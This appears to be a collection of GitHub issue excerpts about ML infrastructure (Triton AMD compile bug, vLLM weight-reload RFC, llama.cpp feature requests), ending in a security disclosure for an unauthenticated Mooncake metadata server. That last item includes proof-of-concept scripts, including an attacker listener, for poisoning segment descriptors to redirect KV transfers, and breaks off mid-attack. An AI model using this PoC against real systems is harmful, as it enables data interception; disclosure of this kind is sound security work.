- GSM8K scored 1,284/1,319 (97.35%) with the checkpoint's default max effort and 1,272/1,319 (96.44%) with `reasoning_effort: low`. The conditions used different output limits and are reported separately in the repository.
- In a repeated-prefix cache study with stable session affinity, median time to first output event was 3.10 seconds on turn 1 and 0.62 seconds on later turns. With a changed leading system line, the corresponding medians were 3.13 and 3.24 seconds.

The serving table and cache study used three repetitions per condition. Since September 3, the repository also publishes the benchmark harness and the request-level rows for both. The repository documents the tested boundaries and excludes unsupported aggregate throughput, decode TPOT, route-latency, and causal claims.

items.author: O1iveira7
items.body_excerpt:
### Describe the bug

 A Triton matmul-style kernel fails to compile on the AMD/HIP backend during
  `make_ttgir`. The failure is triggered by a dynamic `tl.range` loop containing a
  runtime `if` that selects one of two B-matrix pointer expressions before a masked
  `tl.load`, followed by `tl.dot`.

  The failure occurs with `num_stages=2` and reports a dominance verifier error
  while executing `TritonAMDGPUBlockPingpong`:

  ```text
Traceback (most recent call last):

  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 370, in <lambda>
    return lambda *args, **kwargs: self.run(grid=grid, warmup=False, *args, **kwargs)
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 739, in run
  
    kernel = self._do_compile(key, signature, device, constexprs, options, attrs, warmup)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/runtime/jit.py", line 884, in _do_compile
    kernel = self.compile(src, target=target, options=options.__dict__)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/compiler/compiler.py", line 327, in compile
    next_module = compile_ir(module, metadata)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 508, in <lambda>
    stages["ttgir"] = lambda src, metadata: self.make_ttgir(src, metadata, options)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/triton/backends/amd/compiler.py", line 273, in make_ttgir
    pm.run(mod, 'make_ttgir')
RuntimeError: PassManager::run failed

PassManager::run failed
```
  The same reduced reproducer compiles successfully with num_stages=1, which
  suggests the issue is specific to the AMD block-pingpong/pipelining pass rather
  than frontend lowering or pointer canonicalization.
### Reprocuder
Run this on an AMD machine.
```
import torch
import triton
import triton.language as tl


@triton.jit
def repro_dot_dominance(
    switch_ptr,
    a,
    b,
    c,
    M,
    N,
    K,
    stride_am,
    stride_bn,
    BLOCK_M: tl.constexpr,
    BLOCK_N: tl.constexpr,
    BLOCK_K: tl.constexpr,
):
    values = tl.load(switch_ptr + tl.arange(0, 2))
    zero, one = tl.split(values)
    cond = zero > one
    m_offsets = tl.arange(0, BLOCK_M)
    k_offsets = tl.arange(0, BLOCK_K)
    acc = tl.zeros((BLOCK_M, BLOCK_K), tl.float32)

    for n in tl.range(tl.cdiv(N, BLOCK_N)):
        n_offsets = n * BLOCK_N + tl.arange(0, BLOCK_N)
        a_mask = (m_offsets[:, None] < M) & (n_offsets[None, :] < N)
        a_ptrs = a + m_offsets[:, None] * stride_am + n_offsets[None, :]
        a_block = tl.load(a_ptrs, mask=a_mask, other=0.0)

        b_mask = (n_offsets[:, None] < N) & (k_offsets[None, :] < K)
        if cond:
            b_ptrs = b + n_offsets[:, None] * stride_bn + (one * k_offsets)[None, :]
        else:
            b_ptrs = b + n_offsets[:, None] * stride_bn + k_offsets[None, :]
        b_block = tl.load(b_ptrs, mask=b_mask, other=0.0)

        acc = tl.dot(a_block, b_block, acc, allow_tf32=False)

    c_mask = (m_offsets[:, None] < M) & (k_offsets[None, :] < K)
    c_ptrs = c + m_offsets[:, None] * K + k_offsets[None, :]
    tl.store(c_ptrs, acc, mask=c_mask)


def solve(a, b, c, M: int, N: int, K: int):
    switch = torch.tensor([0, 1], dtype=torch.int32, device=a.device)
    grid = (1, 1)
    repro_dot_dominance[grid](
        switch, a, b, c, M, N, K, N, K, 32, 32, 32, num_stages=2
    )
```

### Environment details

- Triton: 3.7.1
- AMD Instinct MI308X

A backend shipped as its own package via extension against a released Triton can't register its profiler without rebuilding Triton.

Let a backend register it's profiler, device and runtime at runtime without need to rebuild Triton

@Jokeren as owner of Profiler module per `CONTRIBUTING.md` - What do you think?

Without this extensions needs to rebuild core Triton to be able to use proton which defeats the purpose of shipping them separately

items.title: [RFC] Weight Reload Correctness for RL
items.author: aoshen02
items.body_excerpt:
**Related RFCs:** [#54477](https://github.com/vllm-project/vllm/issues/54477) (reload refactor), [#45585](https://github.com/vllm-project/vllm/issues/45585) (RL CI roadmap), [#48310](https://github.com/vllm-project/vllm/issues/48310) (sleep/wake correctness), [#48305](https://github.com/vllm-project/vllm/issues/48305) (training-inference consistency), and [#48478](https://github.com/vllm-project/vllm/issues/48478) (production fail-closed storage contract for category 1).

## Problem

Weight reload must produce correct inference output for all model architectures and parallelism configurations. The cases below span vLLM and downstream RL integrations.

This RFC classifies failures by root cause rather than symptom. A single bug may violate more than one invariant, but each item is tracked under its primary category. Repeated layerwise copy-back, post-load, and completion failures motivate the direct-mode refactor in [#54477](https://github.com/vllm-project/vllm/issues/54477); that refactor must satisfy the invariants here rather than replace their acceptance tests.

## Scope

In scope: model/adapter weight load and reload, post-load transformations, reload state restoration, parameter routing, weight-name resolution, and cache invalidation caused by a model or adapter update.

This tracker owns the update half of the complete RL transition:

```text
pause/drain -> sleep -> wake(weights) -> reload/update -> post-load/finalize
            -> wake(kv_cache) -> invalidate versioned caches -> resume
```

The sleep/wake half is tracked in #48310. A successful RL update must satisfy both RFCs; HTTP success alone is not a correctness oracle.

## Failure taxonomy

| # | Category | Required invariant | Minimum regression check |
|---|---|---|---|
| 1 | Storage identity | A tensor address captured by CUDA/HIP Graph or retained by a backend must not change across reload | capture → reload → pointer check → allocation pressure → replay |
| 2 | Runtime value refresh | Every runtime-derived tensor must be recomputed from the new source weight and refreshed in place | load A → post-load → load B → post-load → check derived values/output |
| 3 | Loader lifecycle | A weight loader must remain valid for the parameter's current layout and lifecycle phase; accounting must finalize each layer exactly once and only after every required tensor arrives | load A → layout/kernel setup → load B; vary transfer order/chunking and check exact completion accounting |
| 4 | Reload state preservation | Parameters, buffers, configuration, and backend state required by forward must survive or be rebuilt correctly | compare cold load with warm reload across all runtime state |
| 5 | Parameter routing/sharding | Every checkpoint tensor must be written to the correct parameter, TP rank, and shard | multi-rank load with rank-distinct sentinel values |
| 6 | Name/key mapping | Checkpoint, model, and adapter names must resolve completely and unambiguously | bidirectional key-coverage test; no silent missing/unexpected keys |
| 7 | Post-update cache coherence | Any cache derived from model/adapter version N must either be invalidated or keyed by a new identity before version N+1 serves requests | warm cache on A → update to B → reuse the same request → assert the cache path is exercised and the result matches cold-cache B |

## 1. Storage identity

This category covers long-lived runtime tensors whose device addresses are captured by a graph or retained by a backend. The first post-load pass may bind storage; every subsequent reload must reuse compatible storage. Shape/dtype/device/layout incompatibility must fail explicitly instead of silently replacing it.

### Confirmed

| Tracking | Component | Failure | Status |
|---|---|---|---|
| [#49789](https://github.com/vllm-project/vllm/pull/49789) | Graph-visible runtime state | Register and preserve backend-owned tensors across reload | Open |
| [#50521](https://github.com/vllm-project/vllm/pull/50521) | FlashInfer CUTLASS MoE | Keep captured expert constants in stable storage | Open |
| [#50538](https://github.com/vllm-project/vllm/pull/50538) | FlashInfer B12x MoE | Preserve runtime tensors outside parameter copy-back | Open |
| [#56570](https://github.com/vllm-project/vllm/pull/56570) | FlashInfer TRTLLM BF16 MoE | Update weights without replacing graph-visible storage | Open |
| [#48539](https://github.com/vllm-project/vllm/pull/48539) | Machete act-order permutation | `act_perm` captured a fresh unregistered permutation during every post-load pass. H100 validation found 88/88 pointers rebound; capture artifacts retained the old storage, producing a silent stale read rather than a dangling-pointer crash | Open fix; live red/green validated |
| [Live H100 evidence](https://github.com/vllm-project/vllm/issues/48312#issuecomment-4964191093) | FlashInfer CUTLASS MoE SwiGLU constants | Rebuilding the experts object replaced `gemm1_alpha`, `gemm1_beta`, and `gemm1_clamp_limit`; 72/72 graph-visible tensors moved and all capture-time storages expired on gpt-oss-20b | Confirmed; fix required |

### High-risk candidates

Audited against upstream `main@83762b77`. Static inspection confirms that these paths create or rebind long-lived tensors used by forward; supported-hardware replay is still required before classifying them as reproduced bugs.

| Candidate | Risk | Needed validation |
|---|---|---|
| [AITER MLA FP4/FP8 derived weights](https://github.com/vllm-project/vllm/blob/83762b77b07e97c77f986e4bf5a9474952e47bb3/vllm/model_executor/layers/attention/mla_attention.py#L903-L925) | Every post-load rebuilds `W_K`, `W_K_scale`, `W_V`, and `W_V_scale`; decode passes them directly to AITER BMM kernels | AMD HIP Graph capture → level-2 sleep/wake → reload → replay |
| [FlashInfer B12x MoE runtime scales](https://github.com/vllm-project/vllm/blob/83762b77b07e97c77f986e4bf5a9474952e47bb3/vllm/model_executor/layers/fused_moe/experts/flashinfer_b12x_moe.py#L120-L157) | `_fc2_input_scale`, `w1_sf_m

items.title: [Roadmap] Q4 2026 vLLM × RL
items.author: aoshen02
items.body_excerpt:
## 1. State Transitions / Context Switch

RL training repeatedly moves the inference engine between rollout, weight update, sleep, and resumed rollout. These transitions must be correct, efficient, and safe for in-flight requests.

### 1.1 Weight Update

**Anchor RFC:** [RL Weight Update Roadmap #58906](https://github.com/vllm-project/vllm/issues/58906)

### 1.2 Sleep / Wake / Pause

**Anchor RFC:** [Engine Sleep/Wake/Drain Lifecycle #48311](https://github.com/vllm-project/vllm/issues/48311)

## 2. Training–Inference Consistency

The trainer must be able to interpret rollout results against the model version and execution conditions that produced them.

**Anchor RFC:** [Training–Inference Consistency for RL #48305](https://github.com/vllm-project/vllm/issues/48305)

## 3. Feature Enablement

### 3.1 LoRA for RL

**Anchor RFC:** [LoRA Adapter Lifecycle for RL Training #48297](https://github.com/vllm-project/vllm/issues/48297)

### 3.2 On-Policy Distillation

**Anchor RFC:** [Per-position Target Token Logprobs for Prefill Scoring #56860](https://github.com/vllm-project/vllm/issues/56860)

items.title: [Bug]: vllm.utils.system_utils.suppress_stdout crashes when sys.stdout has no file descriptor
items.author: the-Shallow
items.body_excerpt:
### Your current environment
The output of python collect_env.py ```text OS: Debian GNU/Linux 13.7 (trixie), x86_64, running under WSL2 Kernel: Linux 6.6.87.2-microsoft-standard-WSL2 glibc: 2.41 Python: 3.12.14 NumPy: 2.5.3 PyTorch: 2.13.0+cpu CUDA available: No vLLM package: Not installed; validation executed relevant code extracted from the vLLM v0.30.0 tag ```
### 🐛 Describe the bug Summary `suppress_stdout()` calls `sys.stdout.fileno()` unguarded, so it raises `io.UnsupportedOperation: fileno` whenever the application has replaced `sys.stdout` with a stream that has no underlying file descriptor — e.g. inside `contextlib.redirect_stdout(io.StringIO())` or in a Jupyter/IPython kernel (`ipykernel.iostream.OutStream`). Because `suppress_stdout()` sits on the core distributed-init path (`vllm/distributed/parallel_state.py:505`, `vllm/distributed/utils.py:556`), this aborts engine startup. Reproducing the Bug ```python import contextlib import io from vllm.utils.system_utils import suppress_stdout with contextlib.redirect_stdout(io.StringIO()): with suppress_stdout(): pass ``` ``` io.UnsupportedOperation: fileno File ".../vllm/utils/system_utils.py", line 79, in suppress_stdout stdout_fd = sys.stdout.fileno() ``` Fix Suppress `STDOUT_FILENO` directly instead of asking `sys.stdout` for an fd. ```diff --- a/vllm/utils/system_utils.py +++ b/vllm/utils/system_utils.py @@ -76,7 +76,9 @@ def suppress_stdout(): if envs.VLLM_LOGGING_LEVEL == "DEBUG": yield return - stdout_fd = sys.stdout.fileno() + # C libraries write to STDOUT_FILENO regardless of what `sys.stdout` is + # bound to, and `sys.stdout` may not have an fd at all (Jupyter, StringIO). + stdout_fd = 1 stdout_dup = os.dup(stdout_fd) devnull_fd = os.open(os.devnull, os.O_WRONLY) ``` ### Before submitting a new issue... - [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: Feature Request: Graceful reasoning budget termination. Avoid mid-sentence cutoff.
items.author: CleStil
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

PR #20297 (merged ~2025-03-11) added `--reasoning-budget-message`, which injects
a string at the hard token cutoff to signal the model to wrap up. The injection
still happens at exactly token N with zero warning. The model gets no time to
finish its current thought before the `</think>` boundary.

Graceful termination before the cutoff is expected to improve reasoning
performance. See Motivation and Possible Implementation for details.


### Motivation

Raw truncation of the thinking trace measurably reduces answer quality compared
to graceful termination. Muennighoff et al. (s1: Simple test-time scaling,
arXiv:2501.19393) showed that appending an end-of-thinking delimiter with
"Final Answer:" before the hard cut outperforms naïve truncation. This was
confirmed by follow-up work (arXiv:2505.05315), which states directly that
"the S1 approach performs better than directly truncating the full reasoning
trajectory, underscoring the importance of preserving the solution segment."

The current --reasoning-budget-message implementation injects a wrap-up message
at exactly token N, leaving the model zero tokens to actually act on it. This is
functionally equivalent to truncation with a cosmetic suffix — the model cannot
produce a meaningful conclusion within 0 remaining tokens.

### Possible Implementation

Three approaches in increasing complexity:

Option A — message offset
Inject the budget message at `budget - offset` instead of `budget`, giving the
model `offset` tokens to act on the wrap-up signal. The s1 paper
(https://arxiv.org/abs/2501.19393) shows this outperforms raw truncation.
Change in the COUNTING state of reasoning-budget.cpp:

    if (ctx->remaining <= ctx->warn_offset)  // was: <= 0

Files: reasoning-budget.cpp, reasoning-budget.h, common.h, arg.cpp,
sampling.cpp. Default 0 preserves current behavior.

Option B — separate budgeting
Split total budget into thinking (t) and conclusion (s) phases, t + s = budget.
Force `</think>` at token t, leave s tokens for a conclusion before the answer.
Follow-up work on s1 (https://arxiv.org/abs/2505.05315) shows this outperforms
the basic offset approach. Would add a second parameter, e.g.
--reasoning-budget-conclusion M.

Option C — logit biasing toward `</think>`
Ramp up the logit weight of `</think>` as the budget runs low, then force it at
the hard limit. No dependency on an injected phrase, model-agnostic. NVIDIA NIM
uses this approach with a 10% extension window for sentence completion. More
invasive (sampler changes) but cleanest long-term.

Options A and B build on the existing message injection architecture. Option C
is a parallel approach that could coexist with either.

Happy to test on ROCm/gfx1100 (Qwen3.5-27B) and contribute a draft of Option A
or B if there is interest.

items.title: RFC: MoE expert cache, VRAM caching of hot CPU-resident experts with hybrid hit/miss execution
items.author: leloch
items.body_excerpt:
*Follow-up to #24524, which was closed as too large to review — @am17an suggested
an RFC laying out the benefits vs the maintenance burden, and explicitly suggested
having the AI draft it. So, full disclosure: this document and the code it
describes were predominantly generated by an AI (Anthropic's Claude Fable 5),
working under my direction on my hardware. Code: [`leloch:moe-cache-pr`](https://github.com/ggml-org/llama.cpp/compare/master...leloch:llama.cpp:moe-cache-pr).*

## Problem

When a MoE model spills experts to system RAM (`--cpu-moe` / `--n-cpu-moe` /
auto-fit), decode is dominated by the CPU reading expert weights at RAM
bandwidth while the GPUs idle. Prior attempts (#20757, #21609, #21614, #21620,
#23170) all moved MUL_MAT_ID to the GPU and tried to make the weight copies
cheaper. That puts every cache miss on the critical path as a synchronous PCIe
transfer: @batot1 measured ~3× decode regression from forced decode offload
without residency (#20757), and the Metal slot-pool experiment in the same
thread was 2× slower than vanilla even at 97–99% hit rate, purely from
per-layer sync points. #23170's post-mortem concluded the staging-buffer
approach is a no-op when made correct, and that the fix is a separate
persistent expert-cache buffer with explicit expert→slot bookkeeping.

On the discussions side, #22584 proposes the static version of this idea
(offline expert profiling + strategic placement), #19030 and PR #21067 the
prefetch version (latency-hiding without residency), and #22183 asks the
placement question a runtime cache answers automatically ("use the idle fast
device for experts") — but no runtime expert cache has been proposed as an
RFC before.

## Proposed design

That persistent buffer, plus an inverted execution model: **MUL_MAT_ID stays on
the CPU.** Inside the CPU kernel, thread 0 dispatches one batched matvec over
the cached (hit) rows on the GPU while the other threads compute the miss rows
as they normally would. Misses cost nothing extra, hit rate is pure upside,
worst case degrades to the vanilla CPU path. Fill is decode-only (prompt
routing is far flatter and thrashes the cache); decode routing is skewed
enough to make this work — measured on Qwen3.5-122B, the top 10% of experts
take ~80% of hits (independent corroboration in #20757: Gini ≈ 0.76, ~99%
simulated hit rate at 69% expert budget). Complementary to #21067: prefetch
hides *cold* transfers at large ubatch (prompt); this removes *hot*
re-transfers at ubatch 1 (decode).

## Measured benefit

4× RTX 3090, EPYC 7R13 48c, 8-ch DDR4-3200 256GB; llama-bench tg300, identical command
lines both arms:

| Model | Regime | cache | vanilla | gain |
|---|---|---|---|---|
| GLM-5.1 754B IQ2_M (220 GB) | zero-config | 17.49 | 13.96 | **+25%** |
| Qwen3.5 397B Q3_K_XL (167 GB) | zero-config | 30.25 | 28.18 | +7% |
| Qwen3.5 122B (fits in VRAM) | zero-config | 74.98 | 74.98 | parity (cache dormant) |
| 13 models / 9 architectures | forced `-ngl 99 -ncmoe 99` | | | +10%…+57%, 16/16 ≥ parity |

Quality: decode-path perplexity statistically identical to pure CPU;
prompt/batch path bit-untouched; `test-backend-ops` MUL_MAT_ID 789/789 both
modes. (GPU rounding can flip a near-tie token under greedy decoding, same
class as any `-ngl` change.)

## Maintenance burden:

**Where the code lives.** ~1,700 lines in one new CUDA file pair
(`moe-cache.cu/.cuh`); a backend-agnostic function-pointer API table
(`ggml-backend-moe-cache.h`); small null-checked hooks in `ggml-cpu.c`/`ops.cpp`
(mul_mat_id + GLU) and `ggml-backend.cpp` (scheduler offer/redirect); a fit
rule + `--moe-cache` flag in common. Non-CUDA builds see a zero-initialized
table and no-op hooks; `--moe-cache 0` restores stock behavior exactly.

**The real costs**

1. **It hooks the CPU mul_mat_id hot path.** The hooks are null-checked
   pointers, but anyone refactoring the CPU MoE kernels or the scheduler
   split logic now has a second consumer to think about. This is the largest
   structural cost.
2. **Heuristics that maintainers didn't choose.** Shape-census stability
   window, baseline-sampled bail-out (EWMA, 4 strikes at +5%), VRAM reserve
   default, decode-only fill. They're measured, but they're policy, and
   policy invites tuning requests.
3. **Hard to test in CI.** The cache only engages on spilling MoE models
   during decode; CI can verify it stays dormant and that the dispatch path
   is numerically correct (a built-in selftest does this model-free), but the
   perf claims need big-RAM multi-GPU hardware. Realistically, regressions
   would be caught by users, not CI.
4. **CUDA-only.** The API table is backend-agnostic, but today only CUDA
   registers it; Metal/Vulkan users will ask.
5. **State.** A persistent hot-set file (`~/.cache/llama.cpp/`) and an
   admission/eviction state machine — more surface than a stateless
   optimization.

**What would reduce the burden, if there's interest:**

- A **minimal core** (plain per-node dispatch only: no fused gate+up+SwiGLU,
  no GPU-resident handoff, no hot-set persistence) is roughly half the code
  and keeps most of the gain; I can measure each layer's exact contribution
  on this hardware.
- Landing the **API table + CPU hooks alone** first (~small, inert without a
  backend registration) would let any backend implement caching out-of-tree
  before committing to the CUDA implementation.
- Or: nobody merges anything, and this stays a documented design +
  benchmark set that informs #21067 or a future maintainer-built version.
  That's a fine outcome too.

## Offer

The 4×3090 / 48-core / 8-channel 256GB DDR4-3200 box is available for any benchmark,
ablation, or A/B against #21067 that would help evaluate this. All results
above are reproducible with the commands in the branch's commit messages.

items.title: Misc. bug: /slots restore yields no KV reuse on hybrid/recurrent and SWA models (context checkpoints are not persisted)
items.author: ky095n
items.body_excerpt:
### Name and Version

`b94041a` (2026-08-16); behaviour still present in `36b1015` (2026-09-01) — the code path is unchanged and no commit in between touches slot-save checkpoints.

### Operating systems

Windows

### GGML backends

SYCL

### Hardware

2x Intel Arc Pro B70, oneAPI 2026.1. The mechanism is backend-independent — it is in `tools/server`, not in a backend.

### Problem description

Restoring a slot with `POST /slots/{id}?action=restore` yields **no prompt-cache reuse at all** on hybrid/recurrent and SWA models. The restore reports success, the token list comes back, and then the very next request re-processes the entire prompt.

The cause is that `llama_state_seq_save_file` serialises the sequence state and the token list, but **not** `server_slot::prompt.checkpoints`. On restore, `prompt.checkpoints` is therefore empty. For models where the reuse gate requires a context checkpoint — SWA, and hybrid/recurrent architectures — `find_if` over the empty list fails and the slot falls into:

```
forcing full prompt re-processing due to lack of cache data
(likely due to SWA or hybrid/recurrent memory, see .../pull/13194#issuecomment-2868343055)
```

Measured on Qwen3.8-27B (`qwen35`, 64 layers = 16 full-attention + 48 Gated DeltaNet):

| | `cache_n` after restore | `prompt_n` |
|---|---|---|
| pure-attention model | 8007 of 8011 (99.97%) | ~4 |
| hybrid model | **0** | full prompt |

The failure is silent in the sense that matters: `n_restored` equals `n_saved`, the HTTP response is 200, and nothing indicates the restore accomplished nothing. On a long context this is the difference between a ~1 s resume and a full re-prefill.

This affects a growing model class — Qwen3-Next, Qwen3.5, Qwen3.8 are all hybrid, and `qwen4exp` was added recently.

### Steps to Reproduce

Using the server test harness (`ServerPreset.tinygemma3()` reproduces it via SWA; any hybrid GGUF reproduces it via the recurrent path):

1. Start `llama-server` with `--slot-save-path` on a hybrid or SWA model.
2. Send a prompt long enough to create context checkpoints (more than one ubatch), with `cache_prompt: true`.
3. `POST /slots/0?action=save&filename=x.bin` → succeeds.
4. `POST /slots/0?action=erase`.
5. `POST /slots/0?action=restore&filename=x.bin` → 200, `n_restored == n_saved`.
6. Re-send the identical prompt → `timings.cache_n == 0`, `timings.prompt_n` is the full prompt, and the server logs `forcing full prompt re-processing`.

Expected: the restored slot reuses the prefix, as it does on a pure-attention model.

### First Bad Commit

Not a regression — the checkpoint mechanism and the save/restore format have never interoperated. `common_prompt_checkpoint` lives in `common/` and is invisible to `libllama`'s state serialisation, so there is no revision where this worked.

### Relevant log output

```
slot process_sing: id  0 | task -1 | restored 0 context checkpoint(s)
slot   operator(): id  0 | task 12 | forcing full prompt re-processing due to lack of
  cache data (likely due to SWA or hybrid/recurrent memory, ...)
```

---

**A working patch exists if it is wanted.** I have a branch that appends the slot's newest N context checkpoints to the save file as a trailer, closed by a fixed-size EOF footer, behind `--slot-save-checkpoints N` (default **0**, so a save is byte-identical to today's and nothing changes for existing users). On restore each trailer entry is validated by trial-loading it into the sequence — with the restored state snapshotted and reinstated around the attempt — so malformed or foreign data is dropped with a warning instead of reaching `load_tgt`, which would `GGML_ABORT`. It takes the hybrid case from 0% to full reuse (`cache_n` 117 of 122 on the SWA test model, `prompt_n` 5).

It is 746 insertions, 0 deletions, with 18 server tests including corruption, truncation, lying-header and byte-identity-when-disabled cases. I am **not** opening a PR: I do not run slot persistence in production, so I would be a poor steward through a review cycle. If a maintainer wants it, say so and I will push the branch for anyone to take, adapt or discard — no expectation either way. Filing this mainly so the behaviour is documented, since the current failure mode gives a user no indication that restore did nothing.

items.title: Feature Request: Early-exit speculative drafting via Shannon entropy (comparison with p_min)
items.author: wizardwithcodehazard
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

Add an uncertainty-based early-exit threshold for speculative decoding (`--spec-draft-entropy-max`) using the Shannon entropy of draft candidates:

H = -sum(p * log2(p))

When the entropy of the draft model's output distribution exceeds this threshold, speculative drafting halts early for that sequence. This prevents generating low-confidence draft tokens that are likely to be rejected by the target model, saving forward passes and increasing throughput.


### Motivation

Speculative decoding often loses performance on reasoning or divergent tasks when the draft model generates speculative tokens with low confidence.

Currently, llama.cpp provides `--spec-draft-p-min` to prune drafting based on top-1 probability (`cur_p->data[0].p`). However, top-1 probability only checks the argmax and ignores whether probability mass is tightly focused or dispersed across many tokens.

I benchmarked Shannon entropy gating head-to-head against `--spec-draft-p-min 0.6` on an AMD Ryzen 7 7735HS (8 CPU threads) using Qwen2.5-3B (target) and Qwen2.5-0.5B (draft) with K=8 draft budget over 128+ tokens:

#### 1. Code Generation (`longest common subsequence`, 134 tokens)
| Strategy | Speed | Drafted | Accepted | Acceptance Rate |
|---|---|---|---|---|
| Static Speculation (no gate) | 11.71 t/s | 192 | 110 | 57.29% |
| `--spec-draft-p-min 0.6` | 14.83 t/s | 138 | 109 | 78.99% |
| **Entropy Gate (`entropy 1.5`)** | **16.50 t/s** | **130** | **115** | **88.46%** |

* **+1.67 t/s (+11.3% speedup)** over `p_min 0.6` and **+40.9%** over static speculation.
* Draft acceptance reached 88.46% (only 15 rejected drafts out of 130).

#### 2. Divergent Reasoning / Riddle (130 tokens)
| Strategy | Speed | Drafted | Accepted | Acceptance Rate |
|---|---|---|---|---|
| Static Speculation (no gate) | 6.70 t/s | 324 | 90 | 27.78% |
| `--spec-draft-p-min 0.6` | 12.91 t/s | 102 | 73 | 71.57% |
| **Entropy Gate (`entropy 1.5`)** | **13.19 t/s** | **78** | **66** | **84.62%** |

* **1.97x wall-clock speedup** over static baseline.
* Gating was more selective: drafted 78 tokens instead of 102, achieving 84.62% acceptance vs 71.57% for `p_min 0.6`.


### Possible Implementation

I have a working, tested branch ready:
https://github.com/wizardwithcodehazard/llama.cpp/tree/feat/entropy-gated-speculation

1. Add `float entropy_max = 0.0f` to `common_params_speculative_draft` in `common/common.h`.
2. Add `--spec-draft-entropy-max` / `--draft-entropy-max` in `common/arg.cpp`, clamping negative values with `std::max(0.0f, ...)`.
3. In `common/speculative.cpp`, compute Shannon entropy over `cur_p->data[k].p` (with `p > 1e-12f`) after sampling and exit drafting early if `entropy > params.entropy_max`.
4. Applied across all candidate-sampling implementations: `draft_simple`, `eagle3`, `dflash`, and `mtp`.
5. Passes 44/44 unit tests in `ctest`.

Would the maintainers be open to reviewing a PR for this?

*(Implementation and local benchmarking assisted by AI, reviewed and verified manually).*

items.title: [Bug]: Unauthenticated Mooncake HTTP metadata server allows segment descriptor poisoning and KV transfer redirection
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The HTTP metadata server shipped in the mooncake wheel serves GET/PUT/DELETE on `/metadata` without any authentication. A network peer can read every engine's segment descriptor (absolute buffer addresses and data ports), overwrite a victim engine's descriptor to redirect live KV transfers to an attacker-controlled listener while the sender reports success, rewrite `rpc_meta` entries by bypassing the duplicate-key check with DELETE, delete cluster metadata to break new transfers, and grow the server's memory without bound. Runtime-confirmed with the `mooncake.http_metadata_server` component of mooncake-transfer-engine 0.3.11.post1; the same unauthenticated handler still ships in the 0.3.13 wheel and on the main branch as `mooncake-transfer-engine/example/http-metadata-server-python/bootstrap_server.py`. No fix available. Suggested severity: High, CVSS 8.8.

### Details

`mooncake/http_metadata_server.py` (started via `python -m mooncake.http_metadata_server`, default bind 0.0.0.0:8080) is the documented HTTP backend for `TransferEngine` metadata, used as the etcd alternative via a conn string like `http://host:28080/metadata` (`HTTPStoragePlugin` in src/transfer_metadata_plugin.cpp).

The handlers are plain key/value operations with no authentication and no authorization:

- `GET /metadata?key=mooncake/ram/<name>` returns the engine's segment descriptor, including `buffers[].addr` (absolute process addresses), `tcp_data_port`, and RDMA rkeys.
- `PUT` overwrites any segment descriptor. The only integrity check in the file is a duplicate-key rejection for `rpc_meta` keys - and `DELETE` removes the key first, so `DELETE` + `PUT` rewrites `mooncake/rpc_meta/<name>` (the handshake RPC location) without restriction.
- `DELETE` removes any key. Request bodies are read fully into memory and the store dict has no size or key-count limit (aiohttp's default `client_max_size` of 1 MB rejects one huge body, many smaller keys bypass it).

The data plane trusts these values. `TcpTransport::startTransfer` connects to the IP from `rpc_meta` plus `tcp_data_port` from the segment descriptor, with no validation that the descriptor is authentic. After `tcp_data_port` is poisoned, a normal `transfer_sync_write` sends the payload to the attacker's listener. The sender still reports success: the client session completes once the payload is written to the socket and the server side acknowledges nothing.

### PoC

Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1` on two shells of one host (use the host IP 192.168.105.123 below). Terminal 1 starts the server:

```bash
MC_FORCE_TCP=1 python -m mooncake.http_metadata_server --port 28080
```

Terminal 2 runs the receiving victim:

```python
# victim_a.py
import ctypes, time
from mooncake.engine import TransferEngine

buf = ctypes.create_string_buffer(65536)
te = TransferEngine()
te.initialize("va", "http://192.168.105.123:28080/metadata", "tcp", "")
te.register_memory(ctypes.addressof(buf), 65536)
print("va_addr =", ctypes.addressof(buf), flush=True)
time.sleep(7200)
```

Terminal 3 is the attacker listener:

```python
# listener.py
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("192.168.105.123", 39999))
s.listen(1)
c, _ = s.accept()
data = b""
while True:
    chunk = c.recv(65536)
    if not chunk:
        break
    data += chunk
print(len(data), data[:96])   # 88 bytes: 24-byte header (includes target absolute address) + payload
```

Sender, run as a fresh process each round (the segment descriptor is cached per process):

```python
# sender.py
import ctypes
from mooncake.engine import TransferEngine

payload = ctypes.create_string_buffer(b"SECRET_KV_" + b"S" * 54, 64)
te = TransferEngine()
te.initialize("vb", "http://192.168.105.123:28080/metadata", "tcp", "")
ret = te.transfer_sync_write("va", ctypes.addressof(payload), VA_ADDR, 64)  # VA_ADDR printed by victim_a
print("transfer returned", ret)
```

Control round: run `sender.py` once; it prints `transfer returned 0` and victim A's buffer now starts with `SECRET_KV_`.

Attack round:

```bash
# 1. read the victim's descriptor, no credentials
